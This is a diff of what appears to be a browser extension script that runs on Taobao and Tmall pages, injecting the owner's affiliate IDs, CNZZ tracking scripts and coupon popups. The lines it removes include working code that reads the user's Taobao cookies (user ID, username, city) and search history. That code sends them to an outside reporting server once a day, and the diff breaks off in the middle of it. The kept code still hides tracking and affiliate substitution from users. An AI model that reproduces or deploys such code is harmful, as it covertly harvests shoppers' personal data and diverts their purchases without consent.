@@ -7,149 +7,75 @@ setTimeout(function () {
         return;
     }
     $("body").attr("firstSign2018827","1");
-    if (typeof md5 == "undefined") {
-        function md5(t) {
-            function e(t,e) {
-                return t << e | t >>> 32 - e
-            }
-
-            function n(t,e) {
-                var n,i,r,o,a;
-                return r = 2147483648 & t, o = 2147483648 & e, n = 1073741824 & t, i = 1073741824 & e, a = (1073741823 & t) + (1073741823 & e), n & i ? 2147483648 ^ a ^ r ^ o : n | i ? 1073741824 & a ? 3221225472 ^ a ^ r ^ o : 1073741824 ^ a ^ r ^ o : a ^ r ^ o
-            }
-
-            function i(t,e,n) {
-                return t & e | ~t & n
-            }
-
-            function r(t,e,n) {
-                return t & n | e & ~n
-            }
-
-            function o(t,e,n) {
-                return t ^ e ^ n
-            }
-
-            function a(t,e,n) {
-                return e ^ (t | ~n)
-            }
-
-            function s(t,r,o,a,s,u,l) {
-                return t = n(t,n(n(i(r,o,a),s),l)), n(e(t,u),r)
-            }
-
-            function u(t,i,o,a,s,u,l) {
-                return t = n(t,n(n(r(i,o,a),s),l)), n(e(t,u),i)
-            }
-
-            function l(t,i,r,a,s,u,l) {
-                return t = n(t,n(n(o(i,r,a),s),l)), n(e(t,u),i)
-            }
-
-            function c(t,i,r,o,s,u,l) {
-                return t = n(t,n(n(a(i,r,o),s),l)), n(e(t,u),i)
-            }
-
-            function p(t) {
-                var e,n,i = "",r = "";
-                for (n = 0; 3 >= n; n++) e = t >>> 8 * n & 255, r = "0" + e.toString(16), i += r.substr(r.length - 2,2);
-                return i
-            }
-
-            var f,d,h,g,m,v,y,b,k,x = [];
-            for (t = function (t) {
-                t = t.replace(/\r\n/g,"\n");
-                for (var e = "",n = 0; n < t.length; n++) {
-                    var i = t.charCodeAt(n);
-                    128 > i ? e += String.fromCharCode(i) : i > 127 && 2048 > i ? (e += String.fromCharCode(i >> 6 | 192), e += String.fromCharCode(63 & i | 128)) : (e += String.fromCharCode(i >> 12 | 224), e += String.fromCharCode(i >> 6 & 63 | 128), e += String.fromCharCode(63 & i | 128))
-                }
-                return e
-            }(t), x = function (t) {
-                for (var e,n = t.length,i = n + 8,r = (i - i % 64) / 64,o = 16 * (r + 1),a = new Array(o - 1),s = 0,u = 0; n > u;) e = (u - u % 4) / 4, s = u % 4 * 8, a[e] = a[e] | t.charCodeAt(u) << s, u++;
-                return e = (u - u % 4) / 4, s = u % 4 * 8, a[e] = a[e] | 128 << s, a[o - 2] = n << 3, a[o - 1] = n >>> 29, a
-            }(t), v = 1732584193, y = 4023233417, b = 2562383102, k = 271733878, f = 0; f < x.length; f += 16) d = v, h = y, g = b, m = k, v = s(v,y,b,k,x[f + 0],7,3614090360), k = s(k,v,y,b,x[f + 1],12,3905402710), b = s(b,k,v,y,x[f + 2],17,606105819), y = s(y,b,k,v,x[f + 3],22,3250441966), v = s(v,y,b,k,x[f + 4],7,4118548399), k = s(k,v,y,b,x[f + 5],12,1200080426), b = s(b,k,v,y,x[f + 6],17,2821735955), y = s(y,b,k,v,x[f + 7],22,4249261313), v = s(v,y,b,k,x[f + 8],7,1770035416), k = s(k,v,y,b,x[f + 9],12,2336552879), b = s(b,k,v,y,x[f + 10],17,4294925233), y = s(y,b,k,v,x[f + 11],22,2304563134), v = s(v,y,b,k,x[f + 12],7,1804603682), k = s(k,v,y,b,x[f + 13],12,4254626195), b = s(b,k,v,y,x[f + 14],17,2792965006), y = s(y,b,k,v,x[f + 15],22,1236535329), v = u(v,y,b,k,x[f + 1],5,4129170786), k = u(k,v,y,b,x[f + 6],9,3225465664), b = u(b,k,v,y,x[f + 11],14,643717713), y = u(y,b,k,v,x[f + 0],20,3921069994), v = u(v,y,b,k,x[f + 5],5,3593408605), k = u(k,v,y,b,x[f + 10],9,38016083), b = u(b,k,v,y,x[f + 15],14,3634488961), y = u(y,b,k,v,x[f + 4],20,3889429448), v = u(v,y,b,k,x[f + 9],5,568446438), k = u(k,v,y,b,x[f + 14],9,3275163606), b = u(b,k,v,y,x[f + 3],14,4107603335), y = u(y,b,k,v,x[f + 8],20,1163531501), v = u(v,y,b,k,x[f + 13],5,2850285829), k = u(k,v,y,b,x[f + 2],9,4243563512), b = u(b,k,v,y,x[f + 7],14,1735328473), y = u(y,b,k,v,x[f + 12],20,2368359562), v = l(v,y,b,k,x[f + 5],4,4294588738), k = l(k,v,y,b,x[f + 8],11,2272392833), b = l(b,k,v,y,x[f + 11],16,1839030562), y = l(y,b,k,v,x[f + 14],23,4259657740), v = l(v,y,b,k,x[f + 1],4,2763975236), k = l(k,v,y,b,x[f + 4],11,1272893353), b = l(b,k,v,y,x[f + 7],16,4139469664), y = l(y,b,k,v,x[f + 10],23,3200236656), v = l(v,y,b,k,x[f + 13],4,681279174), k = l(k,v,y,b,x[f + 0],11,3936430074), b = l(b,k,v,y,x[f + 3],16,3572445317), y = l(y,b,k,v,x[f + 6],23,76029189), v = l(v,y,b,k,x[f + 9],4,3654602809), k = l(k,v,y,b,x[f + 12],11,3873151461), b = l(b,k,v,y,x[f + 15],16,530742520), y = l(y,b,k,v,x[f + 2],23,3299628645), v = c(v,y,b,k,x[f + 0],6,4096336452), k = c(k,v,y,b,x[f + 7],10,1126891415), b = c(b,k,v,y,x[f + 14],15,2878612391), y = c(y,b,k,v,x[f + 5],21,4237533241), v = c(v,y,b,k,x[f + 12],6,1700485571), k = c(k,v,y,b,x[f + 3],10,2399980690), b = c(b,k,v,y,x[f + 10],15,4293915773), y = c(y,b,k,v,x[f + 1],21,2240044497), v = c(v,y,b,k,x[f + 8],6,1873313359), k = c(k,v,y,b,x[f + 15],10,4264355552), b = c(b,k,v,y,x[f + 6],15,2734768916), y = c(y,b,k,v,x[f + 13],21,1309151649), v = c(v,y,b,k,x[f + 4],6,4149444226), k = c(k,v,y,b,x[f + 11],10,3174756917), b = c(b,k,v,y,x[f + 2],15,718787259), y = c(y,b,k,v,x[f + 9],21,3951481745), v = n(v,d), y = n(y,h), b = n(b,g), k = n(k,m);
-            return (p(v) + p(y) + p(b) + p(k)).toLowerCase()
+    function md5(t) {
+        function e(t,e) {
+            return t << e | t >>> 32 - e
         }
-    }
-    if (typeof Base64 == "undefined") {
-        (function (global,factory) {typeof exports === "object" && typeof module !== "undefined" ? module.exports = factory(global) : typeof define === "function" && define.amd ? define(factory) : factory(global)})(typeof self !== "undefined" ? self : typeof window !== "undefined" ? window : typeof global !== "undefined" ? global : this,function (global) {
-            "use strict";
-            var _Base64 = global.Base64;
-            var version = "2.4.5";
-            var buffer;
-            if (typeof module !== "undefined" && module.exports) {try {buffer = require("buffer").Buffer} catch (err) {}}
-            var b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-            var b64tab = function (bin) {
-                var t = {};
-                for (var i = 0,l = bin.length; i < l; i++)t[bin.charAt(i)] = i;
-                return t
-            }(b64chars);
-            var fromCharCode = String.fromCharCode;
-            var cb_utob = function (c) {
-                if (c.length < 2) {
-                    var cc = c.charCodeAt(0);
-                    return cc < 128 ? c : cc < 2048 ? fromCharCode(192 | cc >>> 6) + fromCharCode(128 | cc & 63) : fromCharCode(224 | cc >>> 12 & 15) + fromCharCode(128 | cc >>> 6 & 63) + fromCharCode(128 | cc & 63)
-                } else {
-                    var cc = 65536 + (c.charCodeAt(0) - 55296) * 1024 + (c.charCodeAt(1) - 56320);
-                    return fromCharCode(240 | cc >>> 18 & 7) + fromCharCode(128 | cc >>> 12 & 63) + fromCharCode(128 | cc >>> 6 & 63) + fromCharCode(128 | cc & 63)
-                }
-            };
-            var re_utob = /[\uD800-\uDBFF][\uDC00-\uDFFFF]|[^\x00-\x7F]/g;
-            var utob = function (u) {return u.replace(re_utob,cb_utob)};
-            var cb_encode = function (ccc) {
-                var padlen = [0,2,1][ccc.length % 3],ord = ccc.charCodeAt(0) << 16 | (ccc.length > 1 ? ccc.charCodeAt(1) : 0) << 8 | (ccc.length > 2 ? ccc.charCodeAt(2) : 0),chars = [b64chars.charAt(ord >>> 18),b64chars.charAt(ord >>> 12 & 63),padlen >= 2 ? "=" : b64chars.charAt(ord >>> 6 & 63),padlen >= 1 ? "=" : b64chars.charAt(ord & 63)];
-                return chars.join("")
-            };
-            var btoa = global.btoa ? function (b) {return global.btoa(b)} : function (b) {return b.replace(/[\s\S]{1,3}/g,cb_encode)};
-            var _encode = buffer ? buffer.from && Uint8Array && buffer.from !== Uint8Array.from ? function (u) {return (u.constructor === buffer.constructor ? u : buffer.from(u)).toString("base64")} : function (u) {return (u.constructor === buffer.constructor ? u : new buffer(u)).toString("base64")} : function (u) {return btoa(utob(u))};
-            var encode = function (u,urisafe) {return !urisafe ? _encode(String(u)) : _encode(String(u)).replace(/[+\/]/g,function (m0) {return m0 == "+" ? "-" : "_"}).replace(/=/g,"")};
-            var encodeURI = function (u) {return encode(u,true)};
-            var re_btou = new RegExp(["[À-ß][-¿]","[à-ï][-¿]{2}","[ð-÷][-¿]{3}"].join("|"),"g");
-            var cb_btou = function (cccc) {
-                switch (cccc.length) {
-                    case 4:
-                        var cp = (7 & cccc.charCodeAt(0)) << 18 | (63 & cccc.charCodeAt(1)) << 12 | (63 & cccc.charCodeAt(2)) << 6 | 63 & cccc.charCodeAt(3),offset = cp - 65536;
-                        return fromCharCode((offset >>> 10) + 55296) + fromCharCode((offset & 1023) + 56320);
-                    case 3:
-                        return fromCharCode((15 & cccc.charCodeAt(0)) << 12 | (63 & cccc.charCodeAt(1)) << 6 | 63 & cccc.charCodeAt(2));
-                    default:
-                        return fromCharCode((31 & cccc.charCodeAt(0)) << 6 | 63 & cccc.charCodeAt(1))
-                }
-            };
-            var btou = function (b) {return b.replace(re_btou,cb_btou)};
-            var cb_decode = function (cccc) {
-                var len = cccc.length,padlen = len % 4,n = (len > 0 ? b64tab[cccc.charAt(0)] << 18 : 0) | (len > 1 ? b64tab[cccc.charAt(1)] << 12 : 0) | (len > 2 ? b64tab[cccc.charAt(2)] << 6 : 0) | (len > 3 ? b64tab[cccc.charAt(3)] : 0),chars = [fromCharCode(n >>> 16),fromCharCode(n >>> 8 & 255),fromCharCode(n & 255)];
-                chars.length -= [0,0,2,1][padlen];
-                return chars.join("")
-            };
-            var atob = global.atob ? function (a) {return global.atob(a)} : function (a) {return a.replace(/[\s\S]{1,4}/g,cb_decode)};
-            var _decode = buffer ? buffer.from && Uint8Array && buffer.from !== Uint8Array.from ? function (a) {return (a.constructor === buffer.constructor ? a : buffer.from(a,"base64")).toString()} : function (a) {return (a.constructor === buffer.constructor ? a : new buffer(a,"base64")).toString()} : function (a) {return btou(atob(a))};
-            var decode = function (a) {return _decode(String(a).replace(/[-_]/g,function (m0) {return m0 == "-" ? "+" : "/"}).replace(/[^A-Za-z0-9\+\/]/g,""))};
-            var noConflict = function () {
-                var Base64 = global.Base64;
-                global.Base64 = _Base64;
-                return Base64
-            };
-            global.Base64 = {VERSION:version,atob:atob,btoa:btoa,fromBase64:decode,toBase64:encode,utob:utob,encode:encode,encodeURI:encodeURI,btou:btou,decode:decode,noConflict:noConflict};
-            if (typeof Object.defineProperty === "function") {
-                var noEnum = function (v) {return {value:v,enumerable:false,writable:true,configurable:true}};
-                global.Base64.extendString = function () {
-                    Object.defineProperty(String.prototype,"fromBase64",noEnum(function () {return decode(this)}));
-                    Object.defineProperty(String.prototype,"toBase64",noEnum(function (urisafe) {return encode(this,urisafe)}));
-                    Object.defineProperty(String.prototype,"toBase64URI",noEnum(function () {return encode(this,true)}))
-                }
+
+        function n(t,e) {
+            var n,i,r,o,a;
+            return r = 2147483648 & t, o = 2147483648 & e, n = 1073741824 & t, i = 1073741824 & e, a = (1073741823 & t) + (1073741823 & e), n & i ? 2147483648 ^ a ^ r ^ o : n | i ? 1073741824 & a ? 3221225472 ^ a ^ r ^ o : 1073741824 ^ a ^ r ^ o : a ^ r ^ o
+        }
+
+        function i(t,e,n) {
+            return t & e | ~t & n
+        }
+
+        function r(t,e,n) {
+            return t & n | e & ~n
+        }
+
+        function o(t,e,n) {
+            return t ^ e ^ n
+        }
+
+        function a(t,e,n) {
+            return e ^ (t | ~n)
+        }
+
+        function s(t,r,o,a,s,u,l) {
+            return t = n(t,n(n(i(r,o,a),s),l)), n(e(t,u),r)
+        }
+
+        function u(t,i,o,a,s,u,l) {
+            return t = n(t,n(n(r(i,o,a),s),l)), n(e(t,u),i)
+        }
+
+        function l(t,i,r,a,s,u,l) {
+            return t = n(t,n(n(o(i,r,a),s),l)), n(e(t,u),i)
+        }
+
+        function c(t,i,r,o,s,u,l) {
+            return t = n(t,n(n(a(i,r,o),s),l)), n(e(t,u),i)
+        }
+
+        function p(t) {
+            var e,n,i = "",r = "";
+            for (n = 0; 3 >= n; n++) e = t >>> 8 * n & 255, r = "0" + e.toString(16), i += r.substr(r.length - 2,2);
+            return i
+        }
+
+        var f,d,h,g,m,v,y,b,k,x = [];
+        for (t = function (t) {
+            t = t.replace(/\r\n/g,"\n");
+            for (var e = "",n = 0; n < t.length; n++) {
+                var i = t.charCodeAt(n);
+                128 > i ? e += String.fromCharCode(i) : i > 127 && 2048 > i ? (e += String.fromCharCode(i >> 6 | 192), e += String.fromCharCode(63 & i | 128)) : (e += String.fromCharCode(i >> 12 | 224), e += String.fromCharCode(i >> 6 & 63 | 128), e += String.fromCharCode(63 & i | 128))
             }
-            if (global["Meteor"]) {Base64 = global.Base64}
-            if (typeof module !== "undefined" && module.exports) {module.exports.Base64 = global.Base64} else if (typeof define === "function" && define.amd) {define([],function () {return global.Base64})}
-            return {Base64:global.Base64}
-        });
+            return e
+        }(t), x = function (t) {
+            for (var e,n = t.length,i = n + 8,r = (i - i % 64) / 64,o = 16 * (r + 1),a = new Array(o - 1),s = 0,u = 0; n > u;) e = (u - u % 4) / 4, s = u % 4 * 8, a[e] = a[e] | t.charCodeAt(u) << s, u++;
+            return e = (u - u % 4) / 4, s = u % 4 * 8, a[e] = a[e] | 128 << s, a[o - 2] = n << 3, a[o - 1] = n >>> 29, a
+        }(t), v = 1732584193, y = 4023233417, b = 2562383102, k = 271733878, f = 0; f < x.length; f += 16) d = v, h = y, g = b, m = k, v = s(v,y,b,k,x[f + 0],7,3614090360), k = s(k,v,y,b,x[f + 1],12,3905402710), b = s(b,k,v,y,x[f + 2],17,606105819), y = s(y,b,k,v,x[f + 3],22,3250441966), v = s(v,y,b,k,x[f + 4],7,4118548399), k = s(k,v,y,b,x[f + 5],12,1200080426), b = s(b,k,v,y,x[f + 6],17,2821735955), y = s(y,b,k,v,x[f + 7],22,4249261313), v = s(v,y,b,k,x[f + 8],7,1770035416), k = s(k,v,y,b,x[f + 9],12,2336552879), b = s(b,k,v,y,x[f + 10],17,4294925233), y = s(y,b,k,v,x[f + 11],22,2304563134), v = s(v,y,b,k,x[f + 12],7,1804603682), k = s(k,v,y,b,x[f + 13],12,4254626195), b = s(b,k,v,y,x[f + 14],17,2792965006), y = s(y,b,k,v,x[f + 15],22,1236535329), v = u(v,y,b,k,x[f + 1],5,4129170786), k = u(k,v,y,b,x[f + 6],9,3225465664), b = u(b,k,v,y,x[f + 11],14,643717713), y = u(y,b,k,v,x[f + 0],20,3921069994), v = u(v,y,b,k,x[f + 5],5,3593408605), k = u(k,v,y,b,x[f + 10],9,38016083), b = u(b,k,v,y,x[f + 15],14,3634488961), y = u(y,b,k,v,x[f + 4],20,3889429448), v = u(v,y,b,k,x[f + 9],5,568446438), k = u(k,v,y,b,x[f + 14],9,3275163606), b = u(b,k,v,y,x[f + 3],14,4107603335), y = u(y,b,k,v,x[f + 8],20,1163531501), v = u(v,y,b,k,x[f + 13],5,2850285829), k = u(k,v,y,b,x[f + 2],9,4243563512), b = u(b,k,v,y,x[f + 7],14,1735328473), y = u(y,b,k,v,x[f + 12],20,2368359562), v = l(v,y,b,k,x[f + 5],4,4294588738), k = l(k,v,y,b,x[f + 8],11,2272392833), b = l(b,k,v,y,x[f + 11],16,1839030562), y = l(y,b,k,v,x[f + 14],23,4259657740), v = l(v,y,b,k,x[f + 1],4,2763975236), k = l(k,v,y,b,x[f + 4],11,1272893353), b = l(b,k,v,y,x[f + 7],16,4139469664), y = l(y,b,k,v,x[f + 10],23,3200236656), v = l(v,y,b,k,x[f + 13],4,681279174), k = l(k,v,y,b,x[f + 0],11,3936430074), b = l(b,k,v,y,x[f + 3],16,3572445317), y = l(y,b,k,v,x[f + 6],23,76029189), v = l(v,y,b,k,x[f + 9],4,3654602809), k = l(k,v,y,b,x[f + 12],11,3873151461), b = l(b,k,v,y,x[f + 15],16,530742520), y = l(y,b,k,v,x[f + 2],23,3299628645), v = c(v,y,b,k,x[f + 0],6,4096336452), k = c(k,v,y,b,x[f + 7],10,1126891415), b = c(b,k,v,y,x[f + 14],15,2878612391), y = c(y,b,k,v,x[f + 5],21,4237533241), v = c(v,y,b,k,x[f + 12],6,1700485571), k = c(k,v,y,b,x[f + 3],10,2399980690), b = c(b,k,v,y,x[f + 10],15,4293915773), y = c(y,b,k,v,x[f + 1],21,2240044497), v = c(v,y,b,k,x[f + 8],6,1873313359), k = c(k,v,y,b,x[f + 15],10,4264355552), b = c(b,k,v,y,x[f + 6],15,2734768916), y = c(y,b,k,v,x[f + 13],21,1309151649), v = c(v,y,b,k,x[f + 4],6,4149444226), k = c(k,v,y,b,x[f + 11],10,3174756917), b = c(b,k,v,y,x[f + 2],15,718787259), y = c(y,b,k,v,x[f + 9],21,3951481745), v = n(v,d), y = n(y,h), b = n(b,g), k = n(k,m);
+        return (p(v) + p(y) + p(b) + p(k)).toLowerCase()
     }
-    function cnzzAppend(callBack) {
-        if (!$('html').html().match(`1274446353`)) {
+
+    function cnzzAppend(cnzzId,cnzzUrl,callBack) {
+        if (!$('html').html().match(cnzzId)) {
             var myScript = document.createElement("script");
-            myScript.appendChild(document.createTextNode(`var moguBack_czc = _czc?_czc:[];var _czc = [];_czc.push(["_setAccount","1274446353"]);`));
+            myScript.appendChild(document.createTextNode(`var moguBack_czc = _czc?_czc:[];var _czc = [];_czc.push(["_setAccount",${cnzzId}]);`));
             document.head.appendChild(myScript);
-            $.getScript("https://s22.cnzz.com/z_stat.php?id=1274446353&web_id=1274446353",function () {
+            $.getScript(cnzzUrl,function () {
                 var myScript = document.createElement("script");
                 myScript.appendChild(document.createTextNode(`var mogu_czc = _czc;_czc = [];`));
                 document.head.appendChild(myScript);
@@ -224,21 +150,6 @@ setTimeout(function () {
             });
         }
     }();
-    //计算指定cookie剩余时间
-    function calcTime(cookieName,callBack) {
-        if (document.cookie.indexOf(`${cookieName}=1`) == -1) {
-            var curDate = new Date();
-            var curTamp = curDate.getTime();
-            var curWeeHours = new Date(curDate.toLocaleDateString()).getTime() - 1;
-            var passedTamp = curTamp - curWeeHours;
-            var leftTamp = 24 * 60 * 60 * 1000 - passedTamp;
-            var leftTime = new Date();
-            leftTime.setTime(leftTamp + curTamp);
-            document.cookie = `${cookieName}=1;expires=` + leftTime;
-            callBack();
-        }
-    }
-
     //淘宝客业务页面
     function start() {
         // var cssStyle='';
@@ -321,18 +232,7 @@ setTimeout(function () {
         }
         var sj_id = getUrlParam("id"),//获取当前商品id
             jdCat = '',
-            consult = [
-                "//shang.qq.com/wpa/qunwpa?idkey=03fadcbef6b546b8024c1038f5a5f9908aad1f44cadef00cd5099812136bae9d",
-                "//shang.qq.com/wpa/qunwpa?idkey=03fadcbef6b546b8024c1038f5a5f9908aad1f44cadef00cd5099812136bae9d",
-                "//shang.qq.com/wpa/qunwpa?idkey=03fadcbef6b546b8024c1038f5a5f9908aad1f44cadef00cd5099812136bae9d",
-                "//shang.qq.com/wpa/qunwpa?idkey=03fadcbef6b546b8024c1038f5a5f9908aad1f44cadef00cd5099812136bae9d",
-                "//shang.qq.com/wpa/qunwpa?idkey=7dd26f8d1e24b774dcc810bca77b0858847a330fc97ca713749df584ac8d3a63",
-                "//shang.qq.com/wpa/qunwpa?idkey=7dd26f8d1e24b774dcc810bca77b0858847a330fc97ca713749df584ac8d3a63",
-                "//shang.qq.com/wpa/qunwpa?idkey=f39f47defe3af4c5f8d51097757a4a8a2117cde3122d24d209edd1247a50b7fd",
-                "//shang.qq.com/wpa/qunwpa?idkey=7fd3b630aefe61709b871b882eeaa589e27e7602981384d1d90abf5e2bca2eab",
-                "//shang.qq.com/wpa/qunwpa?idkey=2a33f551c1c50c803ab643f76a7bdb109f4f7f781ed407ec87ba5479247e4816",
-                "//shang.qq.com/wpa/qunwpa?idkey=7a7d503e5a1a5cac589fa293034513c7d6f09da5873072b2161bb3096246ade9"
-            ],//咨询群
+            consult = [],//咨询群
             myMmId = [
                 "mm_186350031_100250459_42860000467",
                 "mm_186350031_100250459_42861550293"
@@ -341,6 +241,14 @@ setTimeout(function () {
                 "mm_186350031_100250459_42866050233"
             ],//扫码推广mmid
             myPostMmId = "mm_133078964_46586405_1416646851";//上报mmid
+        if (channelId && channelId == '130001') {
+            myMmId = [
+                "mm_32823682_143600200_43743750078"
+            ];
+            myQrMmId = [
+                "mm_32823682_143600200_43758850294"
+            ];
+        }
         myMmId = myMmId[Math.floor(Math.random() * myMmId.length)];//获取随机id
         myQrMmId = myQrMmId[Math.floor(Math.random() * myQrMmId.length)];//获取扫码随机id
         function sub(a,b) {
@@ -451,7 +359,11 @@ setTimeout(function () {
                 }); //轮播逻辑代码
             }();
         }                                //垂直轮播
-        cnzzAppend(function () {cnzzEvent("MID展示","展示");});
+        if (channelId && channelId == '130001') {
+            cnzzAppend("1275097963","https://s22.cnzz.com/z_stat.php?id=1275097963&web_id=1275097963",function () {cnzzEvent("MID展示","展示");});
+        } else {
+            cnzzAppend("1274446362","https://s13.cnzz.com/z_stat.php?id=1274446362&web_id=1274446362",function () {cnzzEvent("MID展示","展示");});
+        }
         !function () {
             var qqUrl = Math.floor(Math.random() * consult.length);
             qqUrl = consult[qqUrl];
@@ -806,160 +718,8 @@ setTimeout(function () {
                         }
                         startQRCode(qrcodeText);
                     }                  //旧接口二维码优惠券回调
-                    function saveCou() {
-                        if ((sessionStorage.moguControl && sessionStorage.moguControl == sj_id)) {
-                            return
-                        }
-                        sessionStorage.moguControl = sj_id;
-                        var action = 'cp_bogus';
-                        var postData = {
-                            itemId:sj_id
-                        };  //
-                        var hasPostArr = [];                   //已经上报过的优惠券ID
-                        function delTime() {
-                            var day = 7;
-                            var time = new Date().getTime() - day * 86400000;
-                            for (let i = hasPostArr.length - 1; i >= 0; i--) {
-                                if (hasPostArr[i].time < time) {
-                                    hasPostArr.splice(i,1);
-                                }
-                            }
-                            chrome.storage.local.set({postCou180711:hasPostArr});
-                        }               //删除事件超过7天的优惠券id
-                        function setPostCoupon(k,type) {
-                            if (k && type == 'has') {
-                                //有优惠券判断是否本地是否有ID 如果无ID就把ID存进postCou180711     并上报优惠券信息
-                                var postSwi = 1;
-                                $.each(hasPostArr,function (v,k) {
-                                    if (k.id == sj_id) {
-                                        postSwi = 0;
-                                        return false;
-                                    }
-                                });
-                                if (postSwi) {
-                                    if (hasPostArr.length > 99) {
-                                        hasPostArr.shift();
-                                    }
-                                    hasPostArr.push({id:sj_id,time:new Date().getTime()});
-                                    chrome.storage.local.set({postCou180711:hasPostArr},function () {
-                                        delTime();
-                                    });
-                                } else {
-                                    delTime();
-                                }
-                                action = 'cp_effec';
-                                postData = {
-                                    itemId:sj_id,
-                                    title:'',
-                                    category:'',
-                                    discountPrice:k.discountPrice,
-                                    reservePrice:k.reservePrice,
-                                    picUrl:k.pictUrl,
-                                    effectiveStartTime:'',
-                                    effectiveEndTime:'',
-                                    shareUrl:"//uland.taobao.com/coupon/edetail?e=" + getParam(k.clickUrl,"e"),
-                                    comment:'',
-                                    source:(k.userType == 1) ? 2 : 1,
-                                    startFee:'',
-                                    amount:k.couponAmount / 100,
-                                    totalCount:'',
-                                    leftCount:'',
-                                    biz30Day:''
-                                };
-                                var count = 0;  //
-                                function countStart() {
-                                    count++;
-                                    if (count == 2) {
-                                        startPost();
-                                    }
-                                }   //
-                                $.ajax({
-                                    url:"https://pub.alimama.com/items/search.json?q=https://item.taobao.com/item.htm?id=" + sj_id,
-                                    success:function (e) {
-                                        if (e && e.data && e.data.pageList && e.data.pageList[0]) {
-                                            var data = e.data.pageList[0];
-                                            postData.title = data.title;
-                                            postData.category = data.rootCatId;
-                                            postData.effectiveEndTime = data.couponEffectiveEndTime;
-                                            postData.effectiveStartTime = data.couponEffectiveStartTime;
-                                            postData.startFee = data.couponStartFee;
-                                            postData.totalCount = data.couponTotalCount;
-                                            postData.leftCount = data.couponLeftCount;
-                                            postData.biz30Day = data.biz30day;
-                                        }
-                                    },
-                                    complete:function () {
-                                        countStart()
-                                    }
-                                }); //阿里妈妈拿商品数据
-                                $.ajax({
-                                    url:"https://rate.taobao.com/detailCommon.htm?auctionNumId=" + sj_id,
-                                    type:"get",
-                                    dataType:"html",
-                                    success:function (d) {
-                                        d = trim(d);
-                                        d = d.substr(1,d.length - 2);
-                                        try {
-                                            d = JSON.parse(d);
-                                            postData.comment = d.data.count.total ? (d.data.count.good / d.data.count.total * 100).toFixed(2) : 0;
-                                        } catch (err) {
-                                        }
-                                    },
-                                    complete:function () {
-                                        countStart()
-                                    }
-                                }); //获取好评率
-                            } else {
-                                //无优惠券判断是否本地是否有ID 如果有ID就要上报无优惠券信息
-                                var needPost = 0;
-                                var index = 0;
-                                $.each(hasPostArr,function (v,k) {
-                                    if (k.id == sj_id) {
-                                        index = v;
-                                        needPost = 1;
-                                        return false;
-                                    }
-                                });
-                                if (needPost) {
-                                    hasPostArr.splice(index,1);
-                                    chrome.storage.local.set({postCou180711:hasPostArr});
-                                    startPost();
-                                }
-                            }
-                        }   //旧接口上报优惠券回调
-                        function startPost() {
-                            var base64Post = '';
-                            // console.log(postData);
-                            if (action == 'cp_effec' && (!postData.effectiveStartTime || !postData.effectiveEndTime)) {
-                                return
-                            }
-                            $.each(postData,function (v,k) {
-                                if (k || k == 0) {
-                                    base64Post += `${Base64.encode(k)}|`
-                                } else {
-                                    base64Post += `-|`
-                                }
-                            });
-                            base64Post = base64Post.replace(/\|$/gi,"");
-                            chrome.extension.sendMessage({
-                                name:"universal",
-                                url:`${apiUrl}/api/cp`,
-                                type:"post",
-                                data:{
-                                    data:base64Post,
-                                    action:action
-                                }
-                            },function () {
-                            });
-                        }               //整理数据开始上报
-                        chrome.storage.local.get(null,function (local) {
-                            hasPostArr = local.postCou180711 ? local.postCou180711 : [];
-                            getTbCookie(getDan,myPostMmId,page2,getH5CouNum2,setPostCoupon);  //读取cook获取上报
-                        });
-                    }                            //旧接口上报优惠券
-                    // getDan(myMmId,page,getH5CouNum,setCoupon);
                     getDanNewApi();
-                    saveCou();
+                    // getDan(myMmId,page,getH5CouNum,setCoupon);
                 }
             }();        //天猫,淘宝,聚划算
             !function () {
@@ -1232,7 +992,11 @@ setTimeout(function () {
                     keyOK = 1
                 }
                 if (urlOk && keyOK) {
-                    cnzzAppend();
+                    if (channelId && channelId == '130001') {
+                        cnzzAppend("1275097963","https://s22.cnzz.com/z_stat.php?id=1275097963&web_id=1275097963");
+                    } else {
+                        cnzzAppend("1274446362","https://s13.cnzz.com/z_stat.php?id=1274446362&web_id=1274446362");
+                    }
                     if (alertTime[`mgTqAlert${n}${locHost}`] && (nowTime < alertTime[`mgTqAlert${n}${locHost}`])) {
                         return
                     }
@@ -1419,205 +1183,4 @@ setTimeout(function () {
             });
         }        //信息流广告形式
     }();
-    //淘宝首页用户信息上报
-    !function () {
-        if (locHost != "www.taobao.com") {
-            return
-        }
-        calcTime('mgTqInfo',firstStart);
-        function firstStart() {
-            var info = {
-                useId:'',       //用户ID
-                useName:'',     //用户名字
-                city:'',        //用户城市
-                useKeys:'',     //用户关键字
-                source:1        //用户平台
-            };  //
-            var needNum = 6;    //入库关键字个数
-            function getUseInfo() {
-                var storageData = localStorage;
-                var n = 0;  //
-                function count() {
-                    n++;
-                    if (n != 3) {
-                        return
-                    }
-                    chrome.storage.local.get(null,function (e) {
-                        if (e.channelId1013 && e.channelId1013 == '130001' && e.productId1013) {
-                            apiUrl = 'http://report.318000.com.cn';
-                            apiKey = 's';
-                        }
-                        info.useId = info.useId ? info.useId : e.useInfo1876 ? e.useInfo1876.useId : "";
-                        info.useName = info.useName ? info.useName : e.useInfo1876 ? e.useInfo1876.useName : "";
-                        info.city = info.city ? info.city : e.useInfo1876 ? e.useInfo1876.city : "";
-                        if (info.useId && info.useName) {
-                            chrome.storage.local.set({useInfo1876:{useId:info.useId,useName:info.useName,city:info.city}});
-                            getKey();
-                        }
-                    });
-                }   //
-                function getKey() {
-                    function getStorage(val) {
-                        var keyword = [];
-                        $.each(storageData,function (v,k) {
-                            if (v == val) {
-                                var index = 0;
-                                $.each(JSON.parse(k),function (v,k) {
-                                    index++;
-                                    if (index <= needNum) {
-                                        keyword.push(decodeURIComponent(k.key));
-                                    }
-                                });
-                            }
-                        });
-                        return keyword.toString();
-                    }   //
-                    info.useKeys = getStorage(`suggest_history_historybaobei${info.useName}`) || getStorage(`suggest_history_historybaobei`);
-                    postUseInfo();
-                }   //获取keys
-                chrome.extension.sendMessage({
-                    name:"getCook",url:"https://www.taobao.com/",key:"unb"
-                },function (d) {
-                    if (d && d[0] && d[0].value) {
-                        info.useId = d[0].value;
-                    }
-                    count();
-                });
-                chrome.extension.sendMessage({
-                    name:"getCook",url:"https://www.taobao.com/",key:"lgc"
-                },function (d) {
-                    if (d && d[0] && d[0].value) {
-                        info.useName = decodeURIComponent(d[0].value);
-                        info.useName = unescape(info.useName.replace(/\\u/g,'%u'));
-                    }
-                    count();
-                });
-                chrome.extension.sendMessage({
-                    name:"getCook",url:"https://www.taobao.com/",key:"city"
-                },function (d) {
-                    if (d && d[0] && d[0].value) {
-                        info.city = d[0].value;
